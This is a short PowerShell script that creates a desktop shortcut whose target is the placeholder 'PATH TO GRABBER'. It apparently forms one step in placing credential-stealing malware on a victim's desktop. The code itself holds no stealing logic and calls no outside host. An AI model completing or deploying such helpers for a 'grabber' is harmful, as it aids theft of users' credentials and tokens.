$username = $env:USERNAME
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
$Shortcut.TargetPath = "PATH TO GRABBER"
$Shortcut.Save()
